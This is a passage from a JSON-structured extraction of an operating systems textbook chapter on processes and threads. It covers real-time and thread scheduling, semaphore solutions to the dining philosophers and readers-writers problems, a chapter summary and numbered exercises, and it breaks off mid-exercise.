            "content": "2.4.4 Scheduling in Real-Time Systems\r\nA real-time system is one in which time plays an essential role. Typically, one\r\nor more physical devices external to the computer generate stimuli, and the com\u0002puter must react appropriately to them within a fixed amount of time. For example,\r\nthe computer in a compact disc player gets the bits as they come off the drive and\r\nmust convert them into music within a very tight time interval. If the calculation\r\ntakes too long, the music will sound peculiar. Other real-time systems are patient\r\nmonitoring in a hospital intensive-care unit, the autopilot in an aircraft, and robot\r\ncontrol in an automated factory. In all these cases, having the right answer but\r\nhaving it too late is often just as bad as not having it at all.\r\nReal-time systems are generally categorized as hard real time, meaning there\r\nare absolute deadlines that must be met—or else!— and soft real time, meaning\r\nthat missing an occasional deadline is undesirable, but nevertheless tolerable. In\r\nboth cases, real-time behavior is achieved by dividing the program into a number\r\nof processes, each of whose behavior is predictable and known in advance. These\r\nprocesses are generally short lived and can run to completion in well under a sec\u0002ond. When an external event is detected, it is the job of the scheduler to schedule\r\nthe processes in such a way that all deadlines are met.\r\nThe events that a real-time system may have to respond to can be further cate\u0002gorized as periodic (meaning they occur at regular intervals) or aperiodic (mean\u0002ing they occur unpredictably). A system may have to respond to multiple periodic\u0002ev ent streams. Depending on how much time each event requires for processing,\r\nhandling all of them may not even be possible. For example, if there are m periodic\r\nev ents and event i occurs with period Pi and requires Ci sec of CPU time to handle\r\neach event, then the load can be handled only if\nSEC. 2.4 SCHEDULING 165\r\nm\r\ni=1\r\nΣ Ci\r\nPi\r\n≤ 1\r\nA real-time system that meets this criterion is said to be schedulable. This means\r\nit can actually be implemented. A process that fails to meet this test cannot be\r\nscheduled because the total amount of CPU time the processes want collectively is\r\nmore than the CPU can deliver.\r\nAs an example, consider a soft real-time system with three periodic events,\r\nwith periods of 100, 200, and 500 msec, respectively. If these events require 50,\r\n30, and 100 msec of CPU time per event, respectively, the system is schedulable\r\nbecause 0. 5 + 0. 15 + 0. 2 < 1. If a fourth event with a period of 1 sec is added, the\r\nsystem will remain schedulable as long as this event does not need more than 150\r\nmsec of CPU time per event. Implicit in this calculation is the assumption that the\r\ncontext-switching overhead is so small that it can be ignored.\r\nReal-time scheduling algorithms can be static or dynamic. The former make\r\ntheir scheduling decisions before the system starts running. The latter make their\r\nscheduling decisions at run time, after execution has started. Static scheduling\r\nworks only when there is perfect information available in advance about the work\r\nto be done and the deadlines that have to be met. Dynamic scheduling algorithms\r\ndo not have these restrictions."
          },
          "2.4.5 Policy Versus Mechanism": {
            "page": 196,
            "content": "2.4.5 Policy Versus Mechanism\r\nUp until now, we hav e tacitly assumed that all the processes in the system be\u0002long to different users and are thus competing for the CPU. While this is often\r\ntrue, sometimes it happens that one process has many children running under its\r\ncontrol. For example, a database-management-system process may have many\r\nchildren. Each child might be working on a different request, or each might have\r\nsome specific function to perform (query parsing, disk access, etc.). It is entirely\r\npossible that the main process has an excellent idea of which of its children are the\r\nmost important (or time critical) and which the least. Unfortunately, none of the\r\nschedulers discussed above accept any input from user processes about scheduling\r\ndecisions. As a result, the scheduler rarely makes the best choice.\r\nThe solution to this problem is to separate the scheduling mechanism from\r\nthe scheduling policy, a long-established principle (Levin et al., 1975). What this\r\nmeans is that the scheduling algorithm is parameterized in some way, but the pa\u0002rameters can be filled in by user processes. Let us consider the database example\r\nonce again. Suppose that the kernel uses a priority-scheduling algorithm but pro\u0002vides a system call by which a process can set (and change) the priorities of its\r\nchildren. In this way, the parent can control how its children are scheduled, even\r\nthough it itself does not do the scheduling. Here the mechanism is in the kernel but\r\npolicy is set by a user process. Policy-mechanism separation is a key idea.\n166 PROCESSES AND THREADS CHAP. 2"
          },
          "2.4.6 Thread Scheduling": {
            "page": 197,
            "content": "2.4.6 Thread Scheduling\r\nWhen several processes each have multiple threads, we have two lev els of par\u0002allelism present: processes and threads. Scheduling in such systems differs sub\u0002stantially depending on whether user-level threads or kernel-level threads (or both)\r\nare supported.\r\nLet us consider user-level threads first. Since the kernel is not aware of the ex\u0002istence of threads, it operates as it always does, picking a process, say, A, and giv\u0002ing A control for its quantum. The thread scheduler inside A decides which thread\r\nto run, say A1. Since there are no clock interrupts to multiprogram threads, this\r\nthread may continue running as long as it wants to. If it uses up the process’ entire\r\nquantum, the kernel will select another process to run.\r\nWhen the process A finally runs again, thread A1 will resume running. It will\r\ncontinue to consume all of A’s time until it is finished. However, its antisocial be\u0002havior will not affect other processes. They will get whatever the scheduler con\u0002siders their appropriate share, no matter what is going on inside process A.\r\nNow consider the case that A’s threads have relatively little work to do per\r\nCPU burst, for example, 5 msec of work within a 50-msec quantum. Consequently,\r\neach one runs for a little while, then yields the CPU back to the thread scheduler.\r\nThis might lead to the sequence A1, A2, A3, A1, A2, A3, A1, A2, A3, A1, before the\r\nkernel switches to process B. This situation is illustrated in Fig. 2-44(a).\r\nProcess A Process B Process A Process B\r\n1. Kernel picks a process 1. Kernel picks a thread\r\nPossible: A1, A2, A3, A1, A2, A3\r\nAlso possible: A1, B1, A2, B2, A3, B3\r\nPossible: A1, A2, A3, A1, A2, A3\r\nNot possible: A1, B1, A2, B2, A3, B3\r\n(a) (b)\r\nOrder in which\r\nthreads run\r\n2. Run-time\r\n system\r\n picks a\r\n thread\r\n123 13 2\r\nFigure 2-44. (a) Possible scheduling of user-level threads with a 50-msec proc\u0002ess quantum and threads that run 5 msec per CPU burst. (b) Possible scheduling\r\nof kernel-level threads with the same characteristics as (a).\r\nThe scheduling algorithm used by the run-time system can be any of the ones\r\ndescribed above. In practice, round-robin scheduling and priority scheduling are\r\nmost common. The only constraint is the absence of a clock to interrupt a thread\r\nthat has run too long. Since threads cooperate, this is usually not an issue.\nSEC. 2.4 SCHEDULING 167\r\nNow consider the situation with kernel-level threads. Here the kernel picks a\r\nparticular thread to run. It does not have to take into account which process the\r\nthread belongs to, but it can if it wants to. The thread is given a quantum and is for\u0002cibly suspended if it exceeds the quantum. With a 50-msec quantum but threads\r\nthat block after 5 msec, the thread order for some period of 30 msec might be A1,\r\nB1, A2, B2, A3, B3, something not possible with these parameters and user-level\r\nthreads. This situation is partially depicted in Fig. 2-44(b).\r\nA major difference between user-level threads and kernel-level threads is the\r\nperformance. Doing a thread switch with user-level threads takes a handful of ma\u0002chine instructions. With kernel-level threads it requires a full context switch,\r\nchanging the memory map and invalidating the cache, which is several orders of\r\nmagnitude slower. On the other hand, with kernel-level threads, having a thread\r\nblock on I/O does not suspend the entire process as it does with user-level threads.\r\nSince the kernel knows that switching from a thread in process A to a thread in\r\nprocess B is more expensive than running a second thread in process A (due to hav\u0002ing to change the memory map and having the memory cache spoiled), it can take\r\nthis information into account when making a decision. For example, given two\r\nthreads that are otherwise equally important, with one of them belonging to the\r\nsame process as a thread that just blocked and one belonging to a different process,\r\npreference could be given to the former.\r\nAnother important factor is that user-level threads can employ an applica\u0002tion-specific thread scheduler. Consider, for example, the Web server of Fig. 2-8.\r\nSuppose that a worker thread has just blocked and the dispatcher thread and two\r\nworker threads are ready. Who should run next? The run-time system, knowing\r\nwhat all the threads do, can easily pick the dispatcher to run next, so that it can\r\nstart another worker running. This strategy maximizes the amount of parallelism in\r\nan environment where workers frequently block on disk I/O. With kernel-level\r\nthreads, the kernel would never know what each thread did (although they could be\r\nassigned different priorities). In general, however, application-specific thread\r\nschedulers can tune an application better than the kernel can."
          }
        }
      },
      "2.5 CLASSICAL IPC PROBLEMS": {
        "page": 198,
        "children": {
          "2.5.1 The Dining Philosophers Problem": {
            "page": 198,
            "content": "2.5.1 The Dining Philosophers Problem\r\nIn 1965, Dijkstra posed and then solved a synchronization problem he called\r\nthe dining philosophers problem. Since that time, everyone inventing yet another\r\nsynchronization primitive has felt obligated to demonstrate how wonderful the new\n168 PROCESSES AND THREADS CHAP. 2\r\nprimitive is by showing how elegantly it solves the dining philosophers problem.\r\nThe problem can be stated quite simply as follows. Five philosophers are seated\r\naround a circular table. Each philosopher has a plate of spaghetti. The spaghetti is\r\nso slippery that a philosopher needs two forks to eat it. Between each pair of plates\r\nis one fork. The layout of the table is illustrated in Fig. 2-45.\r\nFigure 2-45. Lunch time in the Philosophy Department.\r\nThe life of a philosopher consists of alternating periods of eating and thinking.\r\n(This is something of an abstraction, even for philosophers, but the other activities\r\nare irrelevant here.) When a philosopher gets sufficiently hungry, she tries to ac\u0002quire her left and right forks, one at a time, in either order. If successful in acquir\u0002ing two forks, she eats for a while, then puts down the forks, and continues to\r\nthink. The key question is: Can you write a program for each philosopher that does\r\nwhat it is supposed to do and never gets stuck? (It has been pointed out that the\r\ntwo-fork requirement is somewhat artificial; perhaps we should switch from Italian\r\nfood to Chinese food, substituting rice for spaghetti and chopsticks for forks.)\r\nFigure 2-46 shows the obvious solution. The procedure take fork waits until\r\nthe specified fork is available and then seizes it. Unfortunately, the obvious solu\u0002tion is wrong. Suppose that all fiv e philosophers take their left forks simultan\u0002eously. None will be able to take their right forks, and there will be a deadlock.\r\nWe could easily modify the program so that after taking the left fork, the pro\u0002gram checks to see if the right fork is available. If it is not, the philosopher puts\r\ndown the left one, waits for some time, and then repeats the whole process. This\r\nproposal too, fails, although for a different reason. With a little bit of bad luck, all\r\nthe philosophers could start the algorithm simultaneously, picking up their left\r\nforks, seeing that their right forks were not available, putting down their left forks,\nSEC. 2.5 CLASSICAL IPC PROBLEMS 169\r\n#define N 5 /* number of philosophers */\r\nvoid philosopher(int i) /* i: philosopher number, from 0 to 4 */\r\n{\r\nwhile (TRUE) {\r\nthink( ); /* philosopher is thinking */\r\ntake fork(i); /* take left for k */\r\ntake fork((i+1) % N); /* take right for k; % is modulo operator */\r\neat( ); /* yum-yum, spaghetti */\r\nput fork(i); /* put left for k back on the table */\r\nput fork((i+1) % N); /* put right for k back on the table */\r\n}\r\n}\r\nFigure 2-46. A nonsolution to the dining philosophers problem.\r\nwaiting, picking up their left forks again simultaneously, and so on, forever. A\r\nsituation like this, in which all the programs continue to run indefinitely but fail to\r\nmake any progress, is called starvation. (It is called starvation even when the\r\nproblem does not occur in an Italian or a Chinese restaurant.)\r\nNow you might think that if the philosophers would just wait a random time\r\ninstead of the same time after failing to acquire the right-hand fork, the chance that\r\nev erything would continue in lockstep for even an hour is very small. This obser\u0002vation is true, and in nearly all applications trying again later is not a problem. For\r\nexample, in the popular Ethernet local area network, if two computers send a pack\u0002et at the same time, each one waits a random time and tries again; in practice this\r\nsolution works fine. However, in a few applications one would prefer a solution\r\nthat always works and cannot fail due to an unlikely series of random numbers.\r\nThink about safety control in a nuclear power plant.\r\nOne improvement to Fig. 2-46 that has no deadlock and no starvation is to pro\u0002tect the fiv e statements following the call to think by a binary semaphore. Before\r\nstarting to acquire forks, a philosopher would do a down on mutex. After replacing\r\nthe forks, she would do an up on mutex. From a theoretical viewpoint, this solu\u0002tion is adequate. From a practical one, it has a performance bug: only one philoso\u0002pher can be eating at any instant. With fiv e forks available, we should be able to\r\nallow two philosophers to eat at the same time.\r\nThe solution presented in Fig. 2-47 is deadlock-free and allows the maximum\r\nparallelism for an arbitrary number of philosophers. It uses an array, state, to keep\r\ntrack of whether a philosopher is eating, thinking, or hungry (trying to acquire\r\nforks). A philosopher may move into eating state only if neither neighbor is eat\u0002ing. Philosopher i’s neighbors are defined by the macros LEFT and RIGHT. In\r\nother words, if i is 2, LEFT is 1 and RIGHT is 3.\r\nThe program uses an array of semaphores, one per philosopher, so hungry\r\nphilosophers can block if the needed forks are busy. Note that each process runs\r\nthe procedure philosopher as its main code, but the other procedures, take forks,\r\nput forks, and test, are ordinary procedures and not separate processes.\n170 PROCESSES AND THREADS CHAP. 2\r\n#define N 5 /* number of philosophers */\r\n#define LEFT (i+N−1)%N /* number of i’s left neighbor */\r\n#define RIGHT (i+1)%N /* number of i’s right neighbor */\r\n#define THINKING 0 /* philosopher is thinking */\r\n#define HUNGRY 1 /* philosopher is trying to get for ks */\r\n#define EATING 2 /* philosopher is eating */\r\ntypedef int semaphore; /* semaphores are a special kind of int */\r\nint state[N]; /* array to keep track of everyone’s state */\r\nsemaphore mutex = 1; /* mutual exclusion for critical regions */\r\nsemaphore s[N]; /* one semaphore per philosopher */\r\nvoid philosopher(int i) /* i: philosopher number, from 0 to N−1 */\r\n{\r\nwhile (TRUE) { /* repeat forever */\r\nthink( ); /* philosopher is thinking */\r\ntake forks(i); /* acquire two for ks or block */\r\neat( ); /* yum-yum, spaghetti */\r\nput forks(i); /* put both for ks back on table */\r\n}\r\n}\r\nvoid take forks(int i) /* i: philosopher number, from 0 to N−1 */\r\n{\r\ndown(&mutex); /* enter critical region */\r\nstate[i] = HUNGRY; /* record fact that philosopher i is hungry */\r\ntest(i); /* tr y to acquire 2 for ks */\r\nup(&mutex); /* exit critical region */\r\ndown(&s[i]); /* block if for ks were not acquired */\r\n}\r\nvoid put forks(i) /* i: philosopher number, from 0 to N−1 */\r\n{\r\ndown(&mutex); /* enter critical region */\r\nstate[i] = THINKING; /* philosopher has finished eating */\r\ntest(LEFT); /* see if left neighbor can now eat */\r\ntest(RIGHT); /* see if right neighbor can now eat */\r\nup(&mutex); /* exit critical region */\r\n}\r\nvoid test(i) /* i: philosopher number, from 0 to N−1 */\r\n{\r\nif (state[i] == HUNGRY && state[LEFT] != EATING && state[RIGHT] != EATING) {\r\nstate[i] = EATING;\r\nup(&s[i]);\r\n}\r\n}\r\nFigure 2-47. A solution to the dining philosophers problem.\nSEC. 2.5 CLASSICAL IPC PROBLEMS 171"
          },
          "2.5.2 The Readers and Writers Problem": {
            "page": 202,
            "content": "2.5.2 The Readers and Writers Problem\r\nThe dining philosophers problem is useful for modeling processes that are\r\ncompeting for exclusive access to a limited number of resources, such as I/O de\u0002vices. Another famous problem is the readers and writers problem (Courtois et al.,\r\n1971), which models access to a database. Imagine, for example, an airline reser\u0002vation system, with many competing processes wishing to read and write it. It is\r\nacceptable to have multiple processes reading the database at the same time, but if\r\none process is updating (writing) the database, no other processes may have access\r\nto the database, not even readers. The question is how do you program the readers\r\nand the writers? One solution is shown in Fig. 2-48.\r\ntypedef int semaphore; /* use your imagination */\r\nsemaphore mutex = 1; /* controls access to rc */\r\nsemaphore db = 1; /* controls access to the database */\r\nint rc = 0; /* # of processes reading or wanting to */\r\nvoid reader(void)\r\n{\r\nwhile (TRUE) { /* repeat forever */\r\ndown(&mutex); /* get exclusive access to rc */\r\nrc = rc + 1; /* one reader more now */\r\nif (rc == 1) down(&db); /* if this is the first reader ... */\r\nup(&mutex); /* release exclusive access to rc */\r\nread data base( ); /* access the data */\r\ndown(&mutex); /* get exclusive access to rc */\r\nrc = rc − 1; /* one reader few er now */\r\nif (rc == 0) up(&db); /* if this is the last reader ... */\r\nup(&mutex); /* release exclusive access to rc */\r\nuse data read( ); /* noncr itical region */\r\n}\r\n}\r\nvoid writer(void)\r\n{\r\nwhile (TRUE) { /* repeat forever */\r\nthink up data( ); /* noncr itical region */\r\ndown(&db); /* get exclusive access */\r\nwr ite data base( ); /* update the data */\r\nup(&db); /* release exclusive access */\r\n}\r\n}\r\nFigure 2-48. A solution to the readers and writers problem.\r\nIn this solution, the first reader to get access to the database does a down on the\r\nsemaphore db. Subsequent readers merely increment a counter, rc. As readers\n172 PROCESSES AND THREADS CHAP. 2\r\nleave, they decrement the counter, and the last to leave does an up on the sema\u0002phore, allowing a blocked writer, if there is one, to get in.\r\nThe solution presented here implicitly contains a subtle decision worth noting.\r\nSuppose that while a reader is using the database, another reader comes along.\r\nSince having two readers at the same time is not a problem, the second reader is\r\nadmitted. Additional readers can also be admitted if they come along.\r\nNow suppose a writer shows up. The writer may not be admitted to the data\u0002base, since writers must have exclusive access, so the writer is suspended. Later,\r\nadditional readers show up. As long as at least one reader is still active, subse\u0002quent readers are admitted. As a consequence of this strategy, as long as there is a\r\nsteady supply of readers, they will all get in as soon as they arrive. The writer will\r\nbe kept suspended until no reader is present. If a new reader arrives, say, every 2\r\nsec, and each reader takes 5 sec to do its work, the writer will never get in.\r\nTo avoid this situation, the program could be written slightly differently: when\r\na reader arrives and a writer is waiting, the reader is suspended behind the writer\r\ninstead of being admitted immediately. In this way, a writer has to wait for readers\r\nthat were active when it arrived to finish but does not have to wait for readers that\r\ncame along after it. The disadvantage of this solution is that it achieves less con\u0002currency and thus lower performance. Courtois et al. present a solution that gives\r\npriority to writers. For details, we refer you to the paper."
          }
        }
      },
      "2.6 RESEARCH ON PROCESSES AND THREADS": {
        "page": 203,
        "content": "2.6 RESEARCH ON PROCESSES AND THREADS\r\nIn Chap. 1, we looked at some of the current research in operating system\r\nstructure. In this and subsequent chapters we will look at more narrowly focused\r\nresearch, starting with processes. As will become clear in time, some subjects are\r\nmuch more settled than others. Most of the research tends to be on the new topics,\r\nrather than ones that have been around for decades.\r\nThe concept of a process is an example of something that is fairly well settled.\r\nAlmost every system has some notion of a process as a container for grouping to\u0002gether related resources such as an address space, threads, open files, protection\r\npermissions, and so on. Different systems do the grouping slightly differently, but\r\nthese are just engineering differences. The basic idea is not very controversial any\r\nmore, and there is little new research on the subject of processes.\r\nThreads are a newer idea than processes, but they, too, have been chewed over\r\nquite a bit. Still, the occasional paper about threads appears from time to time, for\r\nexample, about thread clustering on multiprocessors (Tam et al., 2007), or on how\r\nwell modern operating systems like Linux scale with many threads and many cores\r\n(Boyd-Wickizer, 2010).\r\nOne particularly active research area deals with recording and replaying a\r\nprocess’ execution (Viennot et al., 2013). Replaying helps developers track down\r\nhard-to-find bugs and security experts to investigate incidents.\nSEC. 2.6 RESEARCH ON PROCESSES AND THREADS 173\r\nSimilarly, much research in the operating systems community these days fo\u0002cuses on security issues. Numerous incidents have demonstrated that users need\r\nbetter protection from attackers (and, occasionally, from themselves). One ap\u0002proach is to track and restrict carefully the information flows in an operating sys\u0002tem (Giffin et al., 2012).\r\nScheduling (both uniprocessor and multiprocessor) is still a topic near and dear\r\nto the heart of some researchers. Some topics being researched include energy-ef\u0002ficient scheduling on mobile devices (Yuan and Nahrstedt, 2006), hyperthread\u0002ing-aware scheduling (Bulpin and Pratt, 2005), and bias-aware scheduling\r\n(Koufaty, 2010). With increasing computation on underpowered, battery-constrain\u0002ed smartphones, some researchers propose to migrate the process to a more pow\u0002erful server in the cloud, as and when useful (Gordon et al., 2012). However, few\r\nactual system designers are walking around all day wringing their hands for lack of\r\na decent thread-scheduling algorithm, so it appears that this type of research is\r\nmore researcher-push than demand-pull. All in all, processes, threads, and schedul\u0002ing are not hot topics for research as they once were. The research has moved on to\r\ntopics like power management, virtualization, clouds, and security."
      },
      "2.7 SUMMARY": {
        "page": 204,
        "content": "2.7 SUMMARY\r\nTo hide the effects of interrupts, operating systems provide a conceptual model\r\nconsisting of sequential processes running in parallel. Processes can be created and\r\nterminated dynamically. Each process has its own address space.\r\nFor some applications it is useful to have multiple threads of control within a\r\nsingle process. These threads are scheduled independently and each one has its\r\nown stack, but all the threads in a process share a common address space. Threads\r\ncan be implemented in user space or in the kernel.\r\nProcesses can communicate with one another using interprocess communica\u0002tion primitives, for example, semaphores, monitors, or messages. These primitives\r\nare used to ensure that no two processes are ever in their critical regions at the\r\nsame time, a situation that leads to chaos. A process can be running, runnable, or\r\nblocked and can change state when it or another process executes one of the\r\ninterprocess communication primitives. Interthread communication is similar.\r\nInterprocess communication primitives can be used to solve such problems as\r\nthe producer-consumer, dining philosophers, and reader-writer. Even with these\r\nprimitives, care has to be taken to avoid errors and deadlocks.\r\nA great many scheduling algorithms have been studied. Some of these are pri\u0002marily used for batch systems, such as shortest-job-first scheduling. Others are\r\ncommon in both batch systems and interactive systems. These algorithms include\r\nround robin, priority scheduling, multilevel queues, guaranteed scheduling, lottery\r\nscheduling, and fair-share scheduling. Some systems make a clean separation be\u0002tween the scheduling mechanism and the scheduling policy, which allows users to\r\nhave control of the scheduling algorithm.\n174 PROCESSES AND THREADS CHAP. 2\r\nPROBLEMS\r\n1. In Fig. 2-2, three process states are shown. In theory, with three states, there could be\r\nsix transitions, two out of each state. However, only four transitions are shown. Are\r\nthere any circumstances in which either or both of the missing transitions might occur?\r\n2. Suppose that you were to design an advanced computer architecture that did process\r\nswitching in hardware, instead of having interrupts. What information would the CPU\r\nneed? Describe how the hardware process switching might work.\r\n3. On all current computers, at least part of the interrupt handlers are written in assembly\r\nlanguage. Why?\r\n4. When an interrupt or a system call transfers control to the operating system, a kernel\r\nstack area separate from the stack of the interrupted process is generally used. Why?\r\n5. A computer system has enough room to hold fiv e programs in its main memory. These\r\nprograms are idle waiting for I/O half the time. What fraction of the CPU time is\r\nwasted?\r\n6. A computer has 4 GB of RAM of which the operating system occupies 512 MB. The\r\nprocesses are all 256 MB (for simplicity) and have the same characteristics. If the goal\r\nis 99% CPU utilization, what is the maximum I/O wait that can be tolerated?\r\n7. Multiple jobs can run in parallel and finish faster than if they had run sequentially.\r\nSuppose that two jobs, each needing 20 minutes of CPU time, start simultaneously.\r\nHow long will the last one take to complete if they run sequentially? How long if they\r\nrun in parallel? Assume 50% I/O wait.\r\n8. Consider a multiprogrammed system with degree of 6 (i.e., six programs in memory at\r\nthe same time). Assume that each process spends 40% of its time waiting for I/O. What\r\nwill be the CPU utilization?\r\n9. Assume that you are trying to download a large 2-GB file from the Internet. The file is\r\navailable from a set of mirror servers, each of which can deliver a subset of the file’s\r\nbytes; assume that a given request specifies the starting and ending bytes of the file.\r\nExplain how you might use threads to improve the download time.\r\n10. In the text it was stated that the model of Fig. 2-11(a) was not suited to a file server\r\nusing a cache in memory. Why not? Could each process have its own cache?\r\n11. If a multithreaded process forks, a problem occurs if the child gets copies of all the\r\nparent’s threads. Suppose that one of the original threads was waiting for keyboard\r\ninput. Now two threads are waiting for keyboard input, one in each process. Does this\r\nproblem ever occur in single-threaded processes?\r\n12. In Fig. 2-8, a multithreaded Web server is shown. If the only way to read from a file is\r\nthe normal blocking read system call, do you think user-level threads or kernel-level\r\nthreads are being used for the Web server? Why?\r\n13. In the text, we described a multithreaded Web server, showing why it is better than a\r\nsingle-threaded server and a finite-state machine server. Are there any circumstances in\r\nwhich a single-threaded server might be better? Give an example.\nCHAP. 2 PROBLEMS 175\r\n14. In Fig. 2-12 the register set is listed as a per-thread rather than a per-process item.\r\nWhy? After all, the machine has only one set of registers.\r\n15. Why would a thread ever voluntarily give up the CPU by calling thread yield? After\r\nall, since there is no periodic clock interrupt, it may never get the CPU back.\r\n16. Can a thread ever be preempted by a clock interrupt? If so, under what circumstances?\r\nIf not, why not?\r\n17. In this problem you are to compare reading a file using a single-threaded file server\r\nand a multithreaded server. It takes 12 msec to get a request for work, dispatch it, and\r\ndo the rest of the necessary processing, assuming that the data needed are in the block\r\ncache. If a disk operation is needed, as is the case one-third of the time, an additional\r\n75 msec is required, during which time the thread sleeps. How many requests/sec can\r\nthe server handle if it is single threaded? If it is multithreaded?\r\n18. What is the biggest advantage of implementing threads in user space? What is the\r\nbiggest disadvantage?\r\n19. In Fig. 2-15 the thread creations and messages printed by the threads are interleaved at\r\nrandom. Is there a way to force the order to be strictly thread 1 created, thread 1 prints\r\nmessage, thread 1 exits, thread 2 created, thread 2 prints message, thread 2 exists, and\r\nso on? If so, how? If not, why not?\r\n20. In the discussion on global variables in threads, we used a procedure create global to\r\nallocate storage for a pointer to the variable, rather than the variable itself. Is this es\u0002sential, or could the procedures work with the values themselves just as well?\r\n21. Consider a system in which threads are implemented entirely in user space, with the\r\nrun-time system getting a clock interrupt once a second. Suppose that a clock interrupt\r\noccurs while some thread is executing in the run-time system. What problem might oc\u0002cur? Can you suggest a way to solve it?\r\n22. Suppose that an operating system does not have anything like the select system call to\r\nsee in advance if it is safe to read from a file, pipe, or device, but it does allow alarm\r\nclocks to be set that interrupt blocked system calls. Is it possible to implement a\r\nthreads package in user space under these conditions? Discuss.\r\n23. Does the busy waiting solution using the turn variable (Fig. 2-23) work when the two\r\nprocesses are running on a shared-memory multiprocessor, that is, two CPUs sharing a\r\ncommon memory?\r\n24. Does Peterson’s solution to the mutual-exclusion problem shown in Fig. 2-24 work\r\nwhen process scheduling is preemptive? How about when it is nonpreemptive?\r\n25. Can the priority inversion problem discussed in Sec. 2.3.4 happen with user-level\r\nthreads? Why or why not?\r\n26. In Sec. 2.3.4, a situation with a high-priority process, H, and a low-priority process, L,\r\nwas described, which led to H looping forever. Does the same problem occur if round\u0002robin scheduling is used instead of priority scheduling? Discuss.\r\n27. In a system with threads, is there one stack per thread or one stack per process when\r\nuser-level threads are used? What about when kernel-level threads are used? Explain.\n176 PROCESSES AND THREADS CHAP. 2\r\n28. When a computer is being developed, it is usually first simulated by a program that\r\nruns one instruction at a time. Even multiprocessors are simulated strictly sequentially\r\nlike this. Is it possible for a race condition to occur when there are no simultaneous\r\nev ents like this?\r\n29. The producer-consumer problem can be extended to a system with multiple producers\r\nand consumers that write (or read) to (from) one shared buffer. Assume that each pro\u0002ducer and consumer runs in its own thread. Will the solution presented in Fig. 2-28,\r\nusing semaphores, work for this system?\r\n30. Consider the following solution to the mutual-exclusion problem involving two proc\u0002esses P0 and P1. Assume that the variable turn is initialized to 0. Process P0’s code is\r\npresented below.\r\n/* Other code */\r\nwhile (turn != 0) { } /* Do nothing and wait. */\r\nCr itical Section /* . . . */\r\ntur n = 0;\r\n/* Other code */\r\nFor process P1, replace 0 by 1 in above code. Determine if the solution meets all the\r\nrequired conditions for a correct mutual-exclusion solution.\r\n31. How could an operating system that can disable interrupts implement semaphores?\r\n32. Show how counting semaphores (i.e., semaphores that can hold an arbitrary value) can\r\nbe implemented using only binary semaphores and ordinary machine instructions.\r\n33. If a system has only two processes, does it make sense to use a barrier to synchronize\r\nthem? Why or why not?\r\n34. Can two threads in the same process synchronize using a kernel semaphore if the\r\nthreads are implemented by the kernel? What if they are implemented in user space?\r\nAssume that no threads in any other processes have access to the semaphore. Discuss\r\nyour answers.\r\n35. Synchronization within monitors uses condition variables and two special operations,\r\nwait and signal. A more general form of synchronization would be to have a single\r\nprimitive, waituntil, that had an arbitrary Boolean predicate as parameter. Thus, one\r\ncould say, for example,\r\nwaituntil x < 0 or y + z < n\r\nThe signal primitive would no longer be needed. This scheme is clearly more general\r\nthan that of Hoare or Brinch Hansen, but it is not used. Why not? (Hint: Think about\r\nthe implementation.)\r\n36. A fast-food restaurant has four kinds of employees: (1) order takers, who take custom\u0002ers’ orders; (2) cooks, who prepare the food; (3) packaging specialists, who stuff the\r\nfood into bags; and (4) cashiers, who give the bags to customers and take their money.\r\nEach employee can be regarded as a communicating sequential process. What form of\r\ninterprocess communication do they use? Relate this model to processes in UNIX.\nCHAP. 2 PROBLEMS 177\r\n37. Suppose that we have a message-passing system using mailboxes. When sending to a\r\nfull mailbox or trying to receive from an empty one, a process does not block. Instead,\r\nit gets an error code back. The process responds to the error code by just trying again,\r\nover and over, until it succeeds. Does this scheme lead to race conditions?\r\n38. The CDC 6600 computers could handle up to 10 I/O processes simultaneously using\r\nan interesting form of round-robin scheduling called processor sharing. A process\r\nswitch occurred after each instruction, so instruction 1 came from process 1, instruc\u0002tion 2 came from process 2, etc. The process switching was done by special hardware,\r\nand the overhead was zero. If a process needed T sec to complete in the absence of\r\ncompetition, how much time would it need if processor sharing was used with n proc\u0002esses?\r\n39. Consider the following piece of C code:\r\nvoid main( ) {\r\nfork( );\r\nfork( );\r\nexit( );\r\n}\r\nHow many child processes are created upon execution of this program?\r\n40. Round-robin schedulers normally maintain a list of all runnable processes, with each\r\nprocess occurring exactly once in the list. What would happen if a process occurred\r\ntwice in the list? Can you think of any reason for allowing this?\r\n41. Can a measure of whether a process is likely to be CPU bound or I/O bound be deter\u0002mined by analyzing source code? How can this be determined at run time?\r\n42. Explain how time quantum value and context switching time affect each other, in a\r\nround-robin scheduling algorithm.\r\n43. Measurements of a certain system have shown that the average process runs for a time\r\nT before blocking on I/O. A process switch requires a time S, which is effectively\r\nwasted (overhead). For round-robin scheduling with quantum Q, giv e a formula for\r\nthe CPU efficiency for each of the following:\r\n(a) Q = ∞\r\n(b) Q > T\r\n(c) S < Q < T\r\n(d) Q = S\r\n(e) Q nearly 0\r\n44. Five jobs are waiting to be run. Their expected run times are 9, 6, 3, 5, and X. In what\r\norder should they be run to minimize average response time? (Your answer will\r\ndepend on X.)\r\n45. Five batch jobs. A through E, arrive at a computer center at almost the same time.\r\nThey hav e estimated running times of 10, 6, 2, 4, and 8 minutes. Their (externally de\u0002termined) priorities are 3, 5, 2, 1, and 4, respectively, with 5 being the highest priority.\r\nFor each of the following scheduling algorithms, determine the mean process\r\nturnaround time. Ignore process switching overhead.\n178 PROCESSES AND THREADS CHAP. 2\r\n(a) Round robin.\r\n(b) Priority scheduling.\r\n(c) First-come, first-served (run in order 10, 6, 2, 4, 8).\r\n(d) Shortest job first.\r\nFor (a), assume that the system is multiprogrammed, and that each job gets its fair\r\nshare of the CPU. For (b) through (d), assume that only one job at a time runs, until it\r\nfinishes. All jobs are completely CPU bound.\r\n46. A process running on CTSS needs 30 quanta to complete. How many times must it be\r\nswapped in, including the very first time (before it has run at all)?\r\n47. Consider a real-time system with two voice calls of periodicity 5 msec each with CPU\r\ntime per call of 1 msec, and one video stream of periodicity 33 ms with CPU time per\r\ncall of 11 msec. Is this system schedulable?\r\n48. For the above problem, can another video stream be added and have the system still be\r\nschedulable?\r\n49. The aging algorithm with a = 1/2 is being used to predict run times. The previous four\r\nruns, from oldest to most recent, are 40, 20, 40, and 15 msec. What is the prediction of\r\nthe next time?\r\n50. A soft real-time system has four periodic events with periods of 50, 100, 200, and 250\r\nmsec each. Suppose that the four events require 35, 20, 10, and x msec of CPU time,\r\nrespectively. What is the largest value of x for which the system is schedulable?\r\n51. In the dining philosophers problem, let the following protocol be used: An even-num\u0002bered philosopher always picks up his left fork before picking up his right fork; an\r\nodd-numbered philosopher always picks up his right fork before picking up his left\r\nfork. Will this protocol guarantee deadlock-free operation?\r\n52. A real-time system needs to handle two voice calls that each run every 6 msec and con\u0002sume 1 msec 